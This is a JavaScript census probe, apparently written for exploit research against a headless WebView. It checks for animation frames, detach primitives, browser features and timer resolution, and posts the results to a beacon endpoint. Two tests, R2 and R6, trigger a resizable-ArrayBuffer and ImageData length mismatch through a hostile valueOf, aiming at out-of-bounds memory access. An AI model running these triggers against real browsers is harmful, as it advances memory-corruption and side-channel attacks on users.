/* p120 — Engine/allocator/surface census (decision inputs for the 14.20 plan)
 *
 * Answers six questions that gate entire attack-surface branches:
 *
 *  R1: Does rAF fire in the headless WebView at all?
 *      -> If NO: canvas GPU-compositing/present-loop races are mostly DEAD
 *         (no frame loop driving uploads/readbacks). Deprioritize.
 *  R2: putImageData after RAB shrink (ImageData stores w/h; buffer shrank):
 *      characterize failure mode: zero-fill | stale self-data | crash.
 *      Predicts whether ImageData-RAB mismatch is leak-capable
 *      (it should NOT be: RAB tail is inside its own reservation).
 *  R3: Detach/detach-like primitives census: ArrayBuffer.prototype.transfer,
 *      transferToFixedLength (ES2024) — extra detach paths w/o SSV.
 *  R4: Feature census that gates recommended branches:
 *      createImageBitmap / OffscreenCanvas / ResizeObserver /
 *      IntersectionObserver / WeakRef / FinalizationRegistry /
 *      CSS.registerProperty / RegExp 'v' flag / speechSynthesis.
 *  R5: Timer resolution (performance.now delta granularity over 200 samples)
 *      -> confirms/denies timing side channels.
 *  R6: ImageData constructor: does new ImageData(u8cOnRAB, w, h) accept a
 *      RAB-backed view, and does the 4*w*h==length check re-read length
 *      AFTER sw/sh valueOf coercion (spec-correct) or before (bug).
 *
 * Beacon prefix: V120C-
 */
(function () {
var RUN_ID = "v120c" + Math.random().toString(36).slice(2, 12);
var PREFIX = "V120C-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({ r: RUN_ID, b: d.slice(0, 1800) }),
      headers: { "Content-Type": "application/json" }
    }).catch(function () {});
  } catch (e) {}
}
B("L", "press120-census");
var hb = setInterval(function () { B("HB", "hb"); }, 5000);

/* ═════ R1: rAF liveness ═══════ */
function test_R1() {
  var r = { t: "R1" };
  try {
    var frames = 0, firstTs = 0;
    var started = Date.now();
    function tick(ts) {
      if (!firstTs) firstTs = ts;
      frames++;
      if (frames < 10 && Date.now() - started < 3000) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
    setTimeout(function () {
      r.frames = frames;
      r.firstTs = typeof firstTs === "number" ? firstTs : "none";
      r.rAFAlive = frames > 0;
      r.SURVIVED = true;
      B("R1-RAF-LIVENESS", r);
    }, 3200);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("R1-ERR", r); }
}

/* ═════ R2: putImageData after RAB shrink ═══════ */
function test_R2() {
  var r = { t: "R2" };
  try {
    var W = 64, H = 64, SIZE = 4 * W * H;
    var rab = new ArrayBuffer(SIZE, { maxByteLength: SIZE });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < u8.length; i++) u8[i] = (i * 7) & 0xFF;
    var view = new Uint8ClampedArray(rab);   /* length-tracking view */
    r.ctorAccepted = false;
    var id = null, ctorErr = null;
    try { id = new ImageData(view, W, H); r.ctorAccepted = true; }
    catch (e) { ctorErr = e.name + ":" + String(e.message).slice(0, 60); }
    r.ctorErr = ctorErr || "ok";

    if (id) {
      var canvas = document.createElement("canvas");
      canvas.width = W; canvas.height = H;
      var ctx = canvas.getContext("2d");
      r.shrinkOk = true;
      try { rab.resize(256); } catch (e2) { r.shrinkOk = false; }
      r.dataLenAfterShrink = id.data.length;   /* 0? small? unchanged? */
      var putErr = null;
      try { ctx.putImageData(id, 0, 0); r.putAccepted = true; }
      catch (e3) { putErr = e3.name + ":" + String(e3.message).slice(0, 60); }
      r.putErr = putErr || "ok";
      /* did the canvas end up with non-degenerate content? */
      try {
        var probe = ctx.getImageData(0, 0, 8, 8).data;
        var nz = 0;
        for (var j = 0; j < probe.length; j++) if (probe[j]) nz++;
        r.readbackNonZero = nz;
      } catch (e4) { r.readbackErr = e4.name; }
    }
    r.SURVIVED = true;
    B("R2-IMAGEDATA-RAB", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("R2-ERR", r); }
}

/* ═════ R3: detach primitives census ═══════ */
function test_R3() {
  var r = { t: "R3" };
  try {
    r.hasTransfer = typeof ArrayBuffer.prototype.transfer === "function";
    r.hasTransferToFixed = typeof ArrayBuffer.prototype.transferToFixedLength === "function";
    if (r.hasTransfer) {
      var b = new ArrayBuffer(64);
      var out = null, err = null;
      try { out = b.transfer(); } catch (e) { err = e.name; }
      r.transferWorks = !!out && b.byteLength === 0 && out.byteLength === 64;
      r.transferErr = err || "ok";
    }
    r.SURVIVED = true;
    B("R3-DETACH-PRIMS", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("R3-ERR", r); }
}

/* ═════ R4: feature census ═══════ */
function test_R4() {
  var r = { t: "R4" };
  try {
    r.createImageBitmap = typeof createImageBitmap === "function";
    r.OffscreenCanvas = typeof OffscreenCanvas !== "undefined";
    r.ResizeObserver = typeof ResizeObserver === "function";
    r.IntersectionObserver = typeof IntersectionObserver === "function";
    r.WeakRef = typeof WeakRef === "function";
    r.FinalizationRegistry = typeof FinalizationRegistry === "function";
    r.CSSregisterProperty = !!(window.CSS && typeof CSS.registerProperty === "function");
    try { new RegExp("[\\q{a}]", "v"); r.regexpV = true; }
    catch (e) { r.regexpV = e.name === "SyntaxError" ? true : false; }
    r.speechSynthesis = typeof speechSynthesis !== "undefined";
    r.PerformanceObserver = typeof PerformanceObserver === "function";
    r.requestIdleCallback = typeof requestIdleCallback === "function";
    r.sharedArrayBuffer = typeof SharedArrayBuffer !== "undefined";
    r.atomic = typeof Atomics !== "undefined";
    r.notifAPI = typeof Notification !== "undefined";
    r.mediaCapabilities = typeof mediaCapabilities !== "undefined";
    r.BlobStream = (function () {
      try { return typeof new Blob(["x"]).stream === "function"; } catch (e) { return false; }
    })();
    r.SURVIVED = true;
    B("R4-FEATURES", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("R4-ERR", r); }
}

/* ═════ R5: timer resolution ═══════ */
function test_R5() {
  var r = { t: "R5" };
  try {
    var deltas = [];
    var last = performance.now();
    for (var i = 0; i < 5000; i++) {
      var now = performance.now();
      if (now !== last) {
        deltas.push(now - last);
        last = now;
        if (deltas.length >= 200) break;
      }
    }
    var min = Infinity, distinct = {};
    for (var j = 0; j < deltas.length; j++) {
      if (deltas[j] < min) min = deltas[j];
      distinct[String(deltas[j])] = 1;
    }
    r.samples = deltas.length;
    r.minDelta = min === Infinity ? "none" : min;
    r.distinctCount = 0;
    for (var k in distinct) r.distinctCount++;
    r.coarse = (min >= 0.95);   /* 1ms-clamped: no fine timing side channel */
    r.SURVIVED = true;
    B("R5-TIMER-RES", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("R5-ERR", r); }
}

/* ═════ R6: ImageData ctor length re-validation ordering ═══════ */
function test_R6() {
  var r = { t: "R6" };
  try {
    var W = 8, H = 8, SIZE = 4 * W * H;
    var rab = new ArrayBuffer(SIZE, { maxByteLength: SIZE });
    var u8c = new Uint8ClampedArray(rab);
    /* sw coercion SHRINKS the RAB. Spec-correct: the 4*sw*sh==length check
     * re-reads AFTER coercion -> TypeError (256 != 2048... wait: we coerce
     * sw to its ORIGINAL value; shrink only changes length; so 4*sw*sh
     * stays 2048 while data length becomes 256 -> mismatch -> throw).
     * BUG signature: constructor ACCEPTS -> ImageData with recorded 8x8
     * dims over a 256-byte buffer -> every putImageData is an OOB machine. */
    var evilW = {
      valueOf: function () { try { rab.resize(256); } catch (e) {} return W; }
    };
    var id = null, ctorErr = null;
    try { id = new ImageData(u8c, evilW, H); r.ctorAccepted = true; }
    catch (e) { ctorErr = e.name + ":" + String(e.message).slice(0, 60); }
    r.ctorErr = ctorErr || "ok";
    if (id) {
      r.idWidth = id.width; r.idHeight = id.height;
      r.idDataLen = id.data.length;      /* spec says 256; anything else = interesting */
      r.rabLen = rab.byteLength;
      var canvas = document.createElement("canvas");
      canvas.width = 32; canvas.height = 32;
      var ctx = canvas.getContext("2d");
      try { ctx.putImageData(id, 0, 0); r.putAccepted = true; } catch (e2) { r.putErr = e2.name; }
      /* if ctor accepted the mismatch, putImageData just attempted a
       * 2048-byte read from a 256-byte buffer — we survived: record it. */
    }
    r.SURVIVED = true;
    B("R6-IMAGEDATA-CTOR-RECHECK", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("R6-ERR", r); }
}

setTimeout(test_R1, 300);
setTimeout(test_R2, 4000);
setTimeout(test_R3, 7000);
setTimeout(test_R4, 8500);
setTimeout(test_R5, 10500);
setTimeout(test_R6, 12500);
setTimeout(function () {
  B("Z", "probe120-done");
  clearInterval(hb);
}, 16000);
})();
